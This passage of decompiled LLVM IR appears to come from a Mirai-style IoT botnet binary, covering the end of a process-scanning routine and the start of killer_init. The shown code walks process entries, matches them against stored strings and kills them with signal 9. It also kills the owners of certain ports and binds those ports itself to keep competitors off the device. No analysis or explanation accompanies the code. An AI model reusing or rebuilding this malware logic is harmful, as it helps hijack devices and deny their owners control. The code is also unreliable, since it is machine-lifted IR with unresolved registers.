dec_label_pc_cc6c.loopexit:                       ; preds = %dec_label_pc_cc84, %dec_label_pc_cc94, %dec_label_pc_cd00
  %v0_cc6c = load i32, i32* @sb, align 4
  %v1_cc70 = inttoptr i32 %v0_cc6c to i32*
  %v2_cc70 = call i32 @__GI_readdir(i32* %v1_cc70)
  %v2_cc74 = icmp eq i32 %v2_cc70, 0
  br i1 %v2_cc74, label %dec_label_pc_ce80, label %dec_label_pc_cc7c.preheader

dec_label_pc_cc7c.preheader:                      ; preds = %dec_label_pc_cc6c.preheader, %dec_label_pc_cc6c.loopexit
  %v0_cc8491 = phi i32 [ %v2_cc70, %dec_label_pc_cc6c.loopexit ], [ %v2_cc7044, %dec_label_pc_cc6c.preheader ]
  br label %dec_label_pc_cc7c

dec_label_pc_cc7c:                                ; preds = %dec_label_pc_cc7c.preheader, %dec_label_pc_ce68
  %v0_cc9c = phi i32 [ %v0_cc8491, %dec_label_pc_cc7c.preheader ], [ %v2_ce74, %dec_label_pc_ce68 ]
  %v0_cc7c = load i32, i32* @r5, align 4
  %v2_cc7c = icmp eq i32 %v0_cc7c, 0
  br i1 %v2_cc7c, label %dec_label_pc_cc84, label %dec_label_pc_ce80

dec_label_pc_cc84:                                ; preds = %dec_label_pc_cc7c
  %v1_cc84 = add i32 %v0_cc9c, 11
  %v2_cc84 = inttoptr i32 %v1_cc84 to i8*
  %v3_cc84 = load i8, i8* %v2_cc84, align 1
  %v4_cc84 = zext i8 %v3_cc84 to i32
  %v1_cc88 = add nsw i32 %v4_cc84, -48
  %tmp = icmp ugt i32 %v1_cc88, 9
  br i1 %tmp, label %dec_label_pc_cc6c.loopexit, label %dec_label_pc_cc94

dec_label_pc_cc94:                                ; preds = %dec_label_pc_cc84
  store i32 %v1_cc84, i32* @r7, align 4
  %v3_cca0 = call i32 @table_retrieve_val(i32 15, i32* null)
  store i32 %v2_ca00, i32* @r0, align 4
  %v3_ccac = call i32 @util_strcpy(i8* %v3_ca24, i32 %v3_cca0)
  %v2_ccb4 = call i32 @util_strlen(i8* %v3_ca24)
  %v0_ccb8 = load i32, i32* @r7, align 4
  %v1_ccbc = load i32, i32* @sl, align 4
  %v2_ccbc = add i32 %v1_ccbc, %v2_ccb4
  store i32 %v2_ccbc, i32* @r0, align 4
  %v2_ccc0 = inttoptr i32 %v2_ccbc to i8*
  %v3_ccc0 = call i32 @util_strcpy(i8* %v2_ccc0, i32 %v0_ccb8)
  %v2_ccc8 = call i32 @util_strlen(i8* %v3_ca24)
  %v0_cccc = load i32, i32* @r5, align 4
  store i32 %v2_ccc8, i32* @r4, align 4
  %v2_ccd8 = inttoptr i32 %v0_cccc to i32*
  %v3_ccd8 = call i32 @table_retrieve_val(i32 16, i32* %v2_ccd8)
  %v0_cce0 = load i32, i32* @r4, align 4
  %v1_cce0 = load i32, i32* @sl, align 4
  %v2_cce0 = add i32 %v1_cce0, %v0_cce0
  store i32 %v2_cce0, i32* @r0, align 4
  %v2_cce4 = inttoptr i32 %v2_cce0 to i8*
  %v3_cce4 = call i32 @util_strcpy(i8* %v2_cce4, i32 %v3_ccd8)
  %v3_ccf4 = call i32 @readlink(i32 %v2_ca00, i32 %v2_c9f0, i32 4096)
  %v7_ccf8 = icmp eq i32 %v3_ccf4, -1
  br i1 %v7_ccf8, label %dec_label_pc_cc6c.loopexit, label %dec_label_pc_cd00

dec_label_pc_cd00:                                ; preds = %dec_label_pc_cc94
  %v0_cd00 = load i32, i32* @r5, align 4
  %v2_cd08 = inttoptr i32 %v0_cd00 to i32*
  %v3_cd08 = call i32 @table_retrieve_val(i32 15, i32* %v2_cd08)
  store i32 %v2_ca00, i32* @r0, align 4
  %v3_cd14 = call i32 @util_strcpy(i8* %v3_ca24, i32 %v3_cd08)
  %v2_cd1c = call i32 @util_strlen(i8* %v3_ca24)
  %v0_cd20 = load i32, i32* @r7, align 4
  %v1_cd24 = load i32, i32* @sl, align 4
  %v2_cd24 = add i32 %v1_cd24, %v2_cd1c
  store i32 %v2_cd24, i32* @r0, align 4
  %v2_cd28 = inttoptr i32 %v2_cd24 to i8*
  %v3_cd28 = call i32 @util_strcpy(i8* %v2_cd28, i32 %v0_cd20)
  %v2_cd30 = call i32 @util_strlen(i8* %v3_ca24)
  %v0_cd34 = load i32, i32* @r5, align 4
  store i32 %v2_cd30, i32* @r4, align 4
  %v2_cd40 = inttoptr i32 %v0_cd34 to i32*
  %v3_cd40 = call i32 @table_retrieve_val(i32 17, i32* %v2_cd40)
  %v0_cd48 = load i32, i32* @r4, align 4
  %v1_cd48 = load i32, i32* @sl, align 4
  %v2_cd48 = add i32 %v1_cd48, %v0_cd48
  store i32 %v2_cd48, i32* @r0, align 4
  %v2_cd4c = inttoptr i32 %v2_cd48 to i8*
  %v3_cd4c = call i32 @util_strcpy(i8* %v2_cd4c, i32 %v3_cd40)
  %v1_cd54 = call i32 @__GI_opendir(i32 %v2_ca00)
  store i32 %v1_cd54, i32* @r8, align 4
  %v2_cd58 = icmp eq i32 %v1_cd54, 0
  br i1 %v2_cd58, label %dec_label_pc_cc6c.loopexit, label %dec_label_pc_cd60.preheader

dec_label_pc_cd60.preheader:                      ; preds = %dec_label_pc_cd00
  %v1_cd6438 = inttoptr i32 %v1_cd54 to i32*
  %v2_cd6439 = call i32 @__GI_readdir(i32* %v1_cd6438)
  store i32 %v2_cd6439, i32* @r6, align 4
  %v2_cd6841 = icmp eq i32 %v2_cd6439, 0
  store i32 4096, i32* @r1, align 4
  store i32 %v2_c9f0, i32* @r0, align 4
  br i1 %v2_cd6841, label %dec_label_pc_ce68, label %dec_label_pc_cd78thread-pre-split

dec_label_pc_cd60.loopexit:                       ; preds = %dec_label_pc_cd80, %dec_label_pc_ce18
  %v0_cd60 = load i32, i32* @r8, align 4
  %v1_cd64 = inttoptr i32 %v0_cd60 to i32*
  %v2_cd64 = call i32 @__GI_readdir(i32* %v1_cd64)
  store i32 %v2_cd64, i32* @r6, align 4
  %v2_cd68 = icmp eq i32 %v2_cd64, 0
  store i32 4096, i32* @r1, align 4
  store i32 %v2_c9f0, i32* @r0, align 4
  br i1 %v2_cd68, label %dec_label_pc_ce68, label %dec_label_pc_cd78thread-pre-split

dec_label_pc_cd78thread-pre-split:                ; preds = %dec_label_pc_cd60.preheader, %dec_label_pc_cd60.loopexit
  %v0_cd78.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_cd78

dec_label_pc_cd78:                                ; preds = %dec_label_pc_cd78thread-pre-split, %dec_label_pc_ce40
  %v0_cd78 = phi i32 [ %v0_cd78.pr, %dec_label_pc_cd78thread-pre-split ], [ 1, %dec_label_pc_ce40 ]
  %v2_cd78 = icmp eq i32 %v0_cd78, 0
  br i1 %v2_cd78, label %dec_label_pc_cd80, label %dec_label_pc_ce68

dec_label_pc_cd80:                                ; preds = %dec_label_pc_cd78
  %v0_cd80 = call i32 @util_zero()
  %v0_cd84 = load i32, i32* @r5, align 4
  %v2_cd8c = inttoptr i32 %v0_cd84 to i32*
  %v3_cd8c = call i32 @table_retrieve_val(i32 15, i32* %v2_cd8c)
  store i32 %v2_ca00, i32* @r0, align 4
  %v3_cd98 = call i32 @util_strcpy(i8* %v3_ca24, i32 %v3_cd8c)
  %v2_cda0 = call i32 @util_strlen(i8* %v3_ca24)
  %v0_cda4 = load i32, i32* @r7, align 4
  %v1_cda8 = load i32, i32* @sl, align 4
  %v2_cda8 = add i32 %v1_cda8, %v2_cda0
  store i32 %v2_cda8, i32* @r0, align 4
  %v2_cdac = inttoptr i32 %v2_cda8 to i8*
  %v3_cdac = call i32 @util_strcpy(i8* %v2_cdac, i32 %v0_cda4)
  %v2_cdb4 = call i32 @util_strlen(i8* %v3_ca24)
  %v0_cdb8 = load i32, i32* @r5, align 4
  store i32 %v2_cdb4, i32* @r4, align 4
  %v2_cdc4 = inttoptr i32 %v0_cdb8 to i32*
  %v3_cdc4 = call i32 @table_retrieve_val(i32 17, i32* %v2_cdc4)
  %v0_cdcc = load i32, i32* @r4, align 4
  %v1_cdcc = load i32, i32* @sl, align 4
  %v2_cdcc = add i32 %v1_cdcc, %v0_cdcc
  store i32 %v2_cdcc, i32* @r0, align 4
  %v2_cdd0 = inttoptr i32 %v2_cdcc to i8*
  %v3_cdd0 = call i32 @util_strcpy(i8* %v2_cdd0, i32 %v3_cdc4)
  %v2_cdd8 = call i32 @util_strlen(i8* %v3_ca24)
  %v1_cde0 = load i32, i32* @sl, align 4
  %v2_cde0 = add i32 %v1_cde0, %v2_cdd8
  store i32 %v2_cde0, i32* @r0, align 4
  %v2_cde4 = inttoptr i32 %v2_cde0 to i8*
  %v3_cde4 = call i32 @util_strcpy(i8* %v2_cde4, i32 ptrtoint (i32* @global_var_19a68.76 to i32))
  %v2_cdec = call i32 @util_strlen(i8* %v3_ca24)
  %v0_cdf0 = load i32, i32* @r6, align 4
  %v1_cdf0 = add i32 %v0_cdf0, 11
  %v1_cdf4 = load i32, i32* @sl, align 4
  %v2_cdf4 = add i32 %v1_cdf4, %v2_cdec
  store i32 %v2_cdf4, i32* @r0, align 4
  %v2_cdf8 = inttoptr i32 %v2_cdf4 to i8*
  %v3_cdf8 = call i32 @util_strcpy(i8* %v2_cdf8, i32 %v1_cdf0)
  %v3_ce08 = call i32 @readlink(i32 %v2_ca00, i32 %v2_c9f0, i32 4096)
  %v7_ce0c = icmp eq i32 %v3_ce08, -1
  br i1 %v7_ce0c, label %dec_label_pc_cd60.loopexit, label %dec_label_pc_ce18

dec_label_pc_ce18:                                ; preds = %dec_label_pc_cd80
  %v2_ce18 = call i32 @util_strlen(i8* %v3_ca10)
  store i32 %v2_ce18, i32* @r1, align 4
  %v4_ce2c = call i32 @util_stristr(i8* %v3_ca10, i32 %v2_ce18, i32 %v2_cc3c.pre-phi)
  %v7_ce30 = icmp eq i32 %v4_ce2c, -1
  br i1 %v7_ce30, label %dec_label_pc_cd60.loopexit, label %dec_label_pc_ce40

dec_label_pc_ce40:                                ; preds = %dec_label_pc_ce18
  %v0_ce38 = load i32, i32* @r7, align 4
  %v2_ce40 = inttoptr i32 %v0_ce38 to i8*
  %v3_ce40 = call i32 @util_atoi(i8* %v2_ce40, i32 10)
  %v2_ce48 = call i32 @kill(i32 %v3_ce40, i32 9)
  %v0_ce4c = load i32, i32* @r8, align 4
  %v1_ce50 = inttoptr i32 %v0_ce4c to i32*
  %v2_ce50 = call i32 @__GI_readdir(i32* %v1_ce50)
  store i32 %v2_ce50, i32* @r6, align 4
  %v2_ce54 = icmp eq i32 %v2_ce50, 0
  store i32 1, i32* @r5, align 4
  store i32 4096, i32* @r1, align 4
  store i32 %v2_c9f0, i32* @r0, align 4
  br i1 %v2_ce54, label %dec_label_pc_ce68, label %dec_label_pc_cd78

dec_label_pc_ce68:                                ; preds = %dec_label_pc_cd60.loopexit, %dec_label_pc_ce40, %dec_label_pc_cd78, %dec_label_pc_cd60.preheader
  %v0_ce68 = load i32, i32* @r8, align 4
  %v1_ce6c = inttoptr i32 %v0_ce68 to i32*
  %v2_ce6c = call i32 @__GI_closedir(i32* %v1_ce6c)
  %v0_ce70 = load i32, i32* @sb, align 4
  %v1_ce74 = inttoptr i32 %v0_ce70 to i32*
  %v2_ce74 = call i32 @__GI_readdir(i32* %v1_ce74)
  %v2_ce78 = icmp eq i32 %v2_ce74, 0
  br i1 %v2_ce78, label %dec_label_pc_ce80, label %dec_label_pc_cc7c

dec_label_pc_ce80:                                ; preds = %dec_label_pc_cc6c.loopexit, %dec_label_pc_ce68, %dec_label_pc_cc7c, %dec_label_pc_cc6c.preheader
  %v0_ce80 = load i32, i32* @sb, align 4
  %v1_ce84 = inttoptr i32 %v0_ce80 to i32*
  %v2_ce84 = call i32 @__GI_closedir(i32* %v1_ce84)
  %v0_ce88 = load i32, i32* @r5, align 4
  %v1_ce88 = urem i32 %v0_ce88, 256
  br label %dec_label_pc_ce8c

dec_label_pc_ce8c:                                ; preds = %dec_label_pc_cc4c, %dec_label_pc_ce80
  %storemerge = phi i32 [ %v1_ce88, %dec_label_pc_ce80 ], [ 0, %dec_label_pc_cc4c ]
  store i32 %storemerge, i32* @r4, align 4
  %v1_ce90 = call i32 @sleep(i32 1)
  %v1_ce98 = call i32 @table_lock_val(i32 15)
  %v1_cea0 = call i32 @table_lock_val(i32 16)
  %v1_cea8 = call i32 @table_lock_val(i32 17)
  br label %dec_label_pc_ceac

dec_label_pc_ceac:                                ; preds = %bb, %dec_label_pc_ceec, %dec_label_pc_ce8c
  %v0_ceac = load i32, i32* @r4, align 4
  store i32 %v3_c9a8, i32* @r4, align 4
  store i32 %v6_c9a8, i32* @r5, align 4
  store i32 %v9_c9a8, i32* @r6, align 4
  store i32 %v12_c9a8, i32* @r7, align 4
  store i32 %v15_c9a8, i32* @r8, align 4
  store i32 %v18_c9a8, i32* @sb, align 4
  store i32 %v21_c9a8, i32* @sl, align 4
  store i32 %v24_c9a8, i32* @fp, align 4
  store i32 %v27_c9a8, i32* @lr, align 4
  ret i32 %v0_ceac

dec_label_pc_cec0:                                ; preds = %dec_label_pc_cba0
  %v1_cec0 = add i32 %v0_cec0, 1
  %v7_cec4 = icmp eq i32 %v0_cec0, 0
  br i1 %v7_cec4, label %dec_label_pc_cecc, label %dec_label_pc_cba8

dec_label_pc_cecc:                                ; preds = %dec_label_pc_cec0
  %v1_cecc = add i32 %v0_cbb0, 3
  %v2_cecc = inttoptr i32 %v1_cecc to i8*
  %v3_cecc = load i8, i8* %v2_cecc, align 1
  %v7_ced0 = icmp eq i8 %v3_cecc, 65
  br i1 %v7_ced0, label %dec_label_pc_cee4, label %dec_label_pc_ced8

dec_label_pc_ced8:                                ; preds = %dec_label_pc_cecc, %dec_label_pc_cee4
  %v0_cbb882 = phi i32 [ %v0_cbb883, %dec_label_pc_cecc ], [ 1, %dec_label_pc_cee4 ]
  br label %dec_label_pc_cb80.backedge

dec_label_pc_cb80.backedge:                       ; preds = %dec_label_pc_ced8, %dec_label_pc_cbac
  %v0_cbb881 = phi i32 [ %v0_cbb882, %dec_label_pc_ced8 ], [ %v0_cbb883, %dec_label_pc_cbac ]
  %v0_cec073 = phi i32 [ %v1_cec0, %dec_label_pc_ced8 ], [ %v0_cbac, %dec_label_pc_cbac ]
  %v0_cba0.pr70 = phi i32 [ 0, %dec_label_pc_ced8 ], [ %v0_cba0.pr71, %dec_label_pc_cbac ]
  %v0_cb80 = add i32 %v0_cbb0, 1
  %v1_cb80 = add i32 %v0_cbb0, 3
  %v2_cb80 = inttoptr i32 %v1_cb80 to i8*
  %v3_cb80 = load i8, i8* %v2_cb80, align 1
  %v4_cb80 = zext i8 %v3_cb80 to i32
  store i32 %v4_cb80, i32* @r3, align 4
  %v2_cb84 = icmp eq i8 %v3_cb80, 0
  %v1_cb88 = add i32 %v0_cb8878, 1
  br i1 %v2_cb84, label %dec_label_pc_cbb8, label %dec_label_pc_cb90

dec_label_pc_cee4:                                ; preds = %dec_label_pc_cecc
  store i32 1, i32* @lr, align 4
  br label %dec_label_pc_ced8

dec_label_pc_ceec:                                ; preds = %dec_label_pc_cc30
  %v1_cef0 = call i32 @table_lock_val(i32 15)
  %v1_cef8 = call i32 @table_lock_val(i32 16)
  %v1_cf00 = call i32 @table_lock_val(i32 17)
  %v1_cf08 = call i32 @table_lock_val(i32 19)
  br label %dec_label_pc_ceac

dec_label_pc_cf10:                                ; preds = %entry
  store i8 48, i8* %stack_var_-72, align 1
  br label %dec_label_pc_ca54

; uselistorder directives
  uselistorder i32 %v1_cb88, { 1, 0 }
  uselistorder i32 %v4_cb80, { 1, 0 }
  uselistorder i32 %v0_cbb881, { 1, 0 }
  uselistorder i32 %v1_cec0, { 1, 0 }
  uselistorder i32 %v2_ce74, { 1, 0 }
  uselistorder i32 %v1_cbe4, { 1, 0 }
  uselistorder i32 %v0_cbf030, { 1, 0 }
  uselistorder i32 %v1_cc08, { 0, 3, 1, 2 }
  uselistorder i32 %v0_cbac, { 1, 0 }
  uselistorder i32 %v0_cb8878, { 1, 0 }
  uselistorder i32 %v0_cec0, { 4, 3, 0, 1, 2 }
  uselistorder i32 %v0_cbb883, { 1, 2, 0 }
  uselistorder i32 %v1_cb8854, { 1, 0 }
  uselistorder i32 %v2_cb6c, { 1, 0 }
  uselistorder i32 %v1_cb68, { 3, 1, 0, 2, 4 }
  uselistorder i32 %v1_cb28, { 0, 2, 1 }
  uselistorder i32 %v0_cb2816, { 1, 0 }
  uselistorder i32 %v1_caf4, { 0, 2, 3, 4, 5, 6, 1 }
  uselistorder i32 %v2_ca84, { 1, 2, 0 }
  uselistorder i32 %v0_ca2c, { 1, 0 }
  uselistorder i32 %v2_ca28, { 1, 0, 2 }
  uselistorder i8* %v3_ca10, { 1, 0, 2 }
  uselistorder i32 %v2_c9f0, { 1, 2, 3, 0, 4, 5 }
  uselistorder i8* %stack_var_-585, { 1, 4, 0, 2, 3 }
  uselistorder i8* %stack_var_-72, { 2, 0, 1 }
  uselistorder i32* %stack_var_-56, { 0, 1, 2, 4, 3 }
  uselistorder i32 (i8*, i32, i32)* @util_fdgets, { 1, 0 }
  uselistorder label %dec_label_pc_ced8, { 1, 0 }
  uselistorder label %dec_label_pc_ceac, { 1, 2, 0 }
  uselistorder label %dec_label_pc_ce8c, { 1, 0 }
  uselistorder label %dec_label_pc_ce80, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_ce68, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_cd78, { 1, 0 }
  uselistorder label %dec_label_pc_cd78thread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_cd60.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_cc7c, { 1, 0 }
  uselistorder label %dec_label_pc_cc7c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_cc6c.loopexit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_cc04, { 2, 1, 0 }
  uselistorder label %dec_label_pc_cbac, { 2, 0, 1 }
  uselistorder label %dec_label_pc_cb90, { 1, 0 }
  uselistorder label %dec_label_pc_cb34, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_ca98.backedge, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_cae8, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_cab0, { 1, 0 }
  uselistorder label %dec_label_pc_ca54, { 1, 0 }
}

define i32 @killer_init(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-8416 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-224 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-4264 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-256 = alloca i32, align 4
  %v3_cf3c = load i32, i32* @r4, align 4
  %v6_cf3c = load i32, i32* @r5, align 4
  %v9_cf3c = load i32, i32* @r6, align 4
  %v12_cf3c = load i32, i32* @r7, align 4
  %v15_cf3c = load i32, i32* @r8, align 4
  %v18_cf3c = load i32, i32* @sb, align 4
  %v21_cf3c = load i32, i32* @sl, align 4
  %v24_cf3c = load i32, i32* @fp, align 4
  %v27_cf3c = load i32, i32* @lr, align 4
  %v2_cf4c = call i32 @__GI_time(i32* null)
  store i32 %v2_cf4c, i32* @r7, align 4
  %v0_cf54 = call i32 @__libc_fork()
  %v7_cf58 = icmp eq i32 %v0_cf54, -1
  %. = zext i1 %v7_cf58 to i32
  %tmp251 = icmp slt i32 %v0_cf54, 1
  %storemerge212 = select i1 %tmp251, i32 %., i32 1
  store i32 %storemerge212, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_24f18.74 to i32), i32* %r3.global-to-local, align 4
  %v2_cf74 = icmp eq i32 %storemerge212, 0
  store i32 %v0_cf54, i32* @global_var_24f18.74, align 4
  br i1 %v2_cf74, label %dec_label_pc_cf90, label %dec_label_pc_cf80

dec_label_pc_cf80:                                ; preds = %dec_label_pc_d234, %dec_label_pc_d118, %entry
  %v1_cf8c = phi i32 [ %v2_d1d0, %dec_label_pc_d118 ], [ %v0_cf54, %entry ], [ 0, %dec_label_pc_d234 ]
  store i32 %v3_cf3c, i32* @r4, align 4
  store i32 %v6_cf3c, i32* @r5, align 4
  store i32 %v9_cf3c, i32* @r6, align 4
  store i32 %v12_cf3c, i32* @r7, align 4
  store i32 %v15_cf3c, i32* @r8, align 4
  store i32 %v18_cf3c, i32* @sb, align 4
  store i32 %v21_cf3c, i32* @sl, align 4
  store i32 %v24_cf3c, i32* @fp, align 4
  store i32 %v27_cf3c, i32* @lr, align 4
  ret i32 %v1_cf8c

dec_label_pc_cf90:                                ; preds = %entry
  %v2_cf90 = ptrtoint i32* %stack_var_-256 to i32
  store i32 %v2_cf90, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-80, align 4
  %v1_cfa8 = call i32 @killer_kill_by_port(i32 58811)
  store i32 -6725, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_cfc0 = load i32, i32* @r5, align 4
  store i32 %v0_cfc0, i32* %r2.global-to-local, align 4
  %v3_cfc8 = call i32 @socket(i32 2, i32 1, i32 %v0_cfc0)
  %v7_cfcc = icmp eq i32 %v3_cfc8, -1
  store i32 %v3_cfc8, i32* @r4, align 4
  br i1 %v7_cfcc, label %dec_label_pc_cff4, label %dec_label_pc_cfd8

dec_label_pc_cfd8:                                ; preds = %dec_label_pc_cf90
  %v2_cfdc = ptrtoint i32* %stack_var_-80 to i32
  store i32 %v2_cfdc, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_cfe4 = call i32 @bind(i32 %v3_cfc8, i32 %v2_cfdc, i32 16)
  %v0_cfe8 = load i32, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_cff0 = call i32 @listen(i32 %v0_cfe8, i32 1)
  br label %dec_label_pc_cff4

dec_label_pc_cff4:                                ; preds = %dec_label_pc_cf90, %dec_label_pc_cfd8
  %v2_cffc = call i32 @killer_kill_by_port(i32 ptrtoint ([3 x i8]* @global_var_c707.78 to i32))
  store i32 -14585, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_d014 = load i32, i32* @r5, align 4
  store i32 %v0_d014, i32* %r2.global-to-local, align 4
  %v3_d01c = call i32 @socket(i32 2, i32 1, i32 %v0_d014)
  %v7_d020 = icmp eq i32 %v3_d01c, -1
  store i32 %v3_d01c, i32* %r4.global-to-local, align 4
  br i1 %v7_d020, label %dec_label_pc_d048, label %dec_label_pc_d02c

dec_label_pc_d02c:                                ; preds = %dec_label_pc_cff4
  %v2_d030 = ptrtoint i32* %stack_var_-80 to i32
  store i32 %v2_d030, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_d038 = call i32 @bind(i32 %v3_d01c, i32 %v2_d030, i32 16)
  %v0_d03c = load i32, i32* %r4.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_d044 = call i32 @listen(i32 %v0_d03c, i32 1)
  br label %dec_label_pc_d048

dec_label_pc_d048:                                ; preds = %dec_label_pc_cff4, %dec_label_pc_d02c
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_d050 = load i32, i32* @r5, align 4
  store i32 %v0_d050, i32* %r2.global-to-local, align 4
  %v3_d054 = call i32 @socket(i32 2, i32 1, i32 %v0_d050)
  %v7_d058 = icmp eq i32 %v3_d054, -1
  store i32 %v3_d054, i32* @r4, align 4
  br i1 %v7_d058, label %dec_label_pc_d080, label %dec_label_pc_d064

dec_label_pc_d064:                                ; preds = %dec_label_pc_d048
  %v2_d068 = ptrtoint i32* %stack_var_-80 to i32
  store i32 %v2_d068, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_d070 = call i32 @bind(i32 %v3_d054, i32 %v2_d068, i32 16)
  %v0_d074 = load i32, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_d07c = call i32 @listen(i32 %v0_d074, i32 1)
  br label %dec_label_pc_d080

dec_label_pc_d080:                                ; preds = %dec_label_pc_d048, %dec_label_pc_d064
  %v1_d084 = call i32 @killer_kill_by_port(i32 5632)
  store i32 %v2_cf90, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_d098 = load i32, i32* @r5, align 4
  store i32 %v0_d098, i32* %r2.global-to-local, align 4
  %v3_d0a0 = call i32 @socket(i32 2, i32 1, i32 %v0_d098)
  %v7_d0a4 = icmp eq i32 %v3_d0a0, -1
  store i32 %v3_d0a0, i32* @r4, align 4
  br i1 %v7_d0a4, label %dec_label_pc_d0cc, label %dec_label_pc_d0b0

dec_label_pc_d0b0:                                ; preds = %dec_label_pc_d080
  %v2_d0b4 = ptrtoint i32* %stack_var_-80 to i32
  store i32 %v2_d0b4, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_d0bc = call i32 @bind(i32 %v3_d0a0, i32 %v2_d0b4, i32 16)
  %v0_d0c0 = load i32, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_d0c8 = call i32 @listen(i32 %v0_d0c0, i32 1)
  br label %dec_label_pc_d0cc

dec_label_pc_d0cc:                                ; preds = %dec_label_pc_d080, %dec_label_pc_d0b0
  %v1_d0d0 = call i32 @killer_kill_by_port(i32 5888)
  store i32 %v2_cf90, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_d0e4 = load i32, i32* @r5, align 4
  store i32 %v0_d0e4, i32* %r2.global-to-local, align 4
  %v3_d0ec = call i32 @socket(i32 2, i32 1, i32 %v0_d0e4)
  %v7_d0f0 = icmp eq i32 %v3_d0ec, -1
  store i32 %v3_d0ec, i32* @r4, align 4
  br i1 %v7_d0f0, label %dec_label_pc_d118, label %dec_label_pc_d0fc

dec_label_pc_d0fc:                                ; preds = %dec_label_pc_d0cc
  %v2_d100 = ptrtoint i32* %stack_var_-80 to i32
  store i32 %v2_d100, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_d108 = call i32 @bind(i32 %v3_d0ec, i32 %v2_d100, i32 16)
  %v0_d10c = load i32, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_d114 = call i32 @listen(i32 %v0_d10c, i32 1)
  br label %dec_label_pc_d118

dec_label_pc_d118:                                ; preds = %dec_label_pc_d0cc, %dec_label_pc_d0fc
  %v1_d11c = call i32 @sleep(i32 5)
  store i32 4096, i32* @r0, align 4
  %v0_d124 = call i32 @malloc()
  store i32 ptrtoint (i32* @global_var_223f8.80 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24f14.82 to i32), i32* %r1.global-to-local, align 4
  store i32 %v0_d124, i32* %r2.global-to-local, align 4
  %v0_d134 = load i32, i32* @r5, align 4
  %v1_d134 = trunc i32 %v0_d134 to i8
  %v3_d134 = inttoptr i32 %v0_d124 to i8*
  store i8 %v1_d134, i8* %v3_d134, align 1
  %v0_d13c = load i32, i32* @r5, align 4
  %v1_d13c = load i32, i32* %r3.global-to-local, align 4
  %v2_d13c = inttoptr i32 %v1_d13c to i32*
  store i32 %v0_d13c, i32* %v2_d13c, align 4
  %v0_d140 = load i32, i32* %r2.global-to-local, align 4
  %v1_d140 = load i32, i32* %r1.global-to-local, align 4
  %v2_d140 = inttoptr i32 %v1_d140 to i32*
  store i32 %v0_d140, i32* %v2_d140, align 4
  %v1_d144 = call i32 @table_unlock_val(i32 15)
  %v1_d14c = call i32 @table_unlock_val(i32 16)
  %v2_d154 = ptrtoint i32* %stack_var_-4264 to i32
  store i32 %v2_d154, i32* %r2.global-to-local, align 4
  %v0_d158 = load i32, i32* @r5, align 4
  store i32 %v0_d158, i32* %r1.global-to-local, align 4
  %v2_d164 = inttoptr i32 %v0_d158 to i32*
  %v3_d164 = call i32 @table_retrieve_val(i32 15, i32* %v2_d164)
  %v1_d16c = add i32 %v2_d154, -56
  store i32 %v1_d16c, i32* %r3.global-to-local, align 4
  store i32 %v3_d164, i32* %r1.global-to-local, align 4
  store i32 %v1_d16c, i32* @r0, align 4
  %v2_d17c = inttoptr i32 %v1_d16c to i8*
  %v3_d17c = call i32 @util_strcpy(i8* %v2_d17c, i32 %v3_d164)
  %v2_d184 = add i32 %v3_d17c, %v1_d16c
  store i32 %v2_d184, i32* @r4, align 4
  %v1_d188 = call i32 @__getpid(i32 %v3_d17c)
  %v2_d190 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_d190, i32* %r2.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v3_d198 = trunc i32 %v1_d188 to i8
  %v4_d198 = call i32 @util_itoa(i8 %v3_d198, i32 10, i32 %v2_d190)
  store i32 %v4_d198, i32* %r1.global-to-local, align 4
  %v0_d1a0 = load i32, i32* @r4, align 4
  store i32 %v0_d1a0, i32* @r0, align 4
  %v2_d1a4 = inttoptr i32 %v0_d1a0 to i8*
  %v3_d1a4 = call i32 @util_strcpy(i8* %v2_d1a4, i32 %v4_d198)
  %v0_d1a8 = load i32, i32* @r5, align 4
  store i32 %v0_d1a8, i32* %r1.global-to-local, align 4
